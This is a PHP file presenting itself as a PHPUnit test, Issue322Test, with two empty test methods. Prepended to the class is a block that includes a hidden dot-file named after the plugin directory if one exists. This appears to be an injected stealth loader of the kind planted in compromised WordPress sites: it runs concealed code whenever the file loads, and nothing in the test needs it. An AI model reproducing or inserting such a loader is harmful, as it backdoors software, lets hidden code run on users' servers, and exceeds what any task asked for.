<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue322Test extends PHPUnit_Framework_TestCase
{
    /**
     * @group one
     */
    public function testOne()
    {
    }

    /**
     * @group two
     */
    public function testTwo()
    {
    }
}
